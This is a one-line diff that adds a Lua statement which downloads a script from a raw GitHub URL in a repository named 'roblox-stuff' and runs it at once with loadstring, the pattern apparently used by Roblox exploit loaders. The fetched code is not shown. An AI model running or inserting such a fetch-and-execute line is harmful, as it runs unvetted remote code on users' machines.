@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/crucifiedbylua/roblox-stuff/refs/heads/main/st"))()
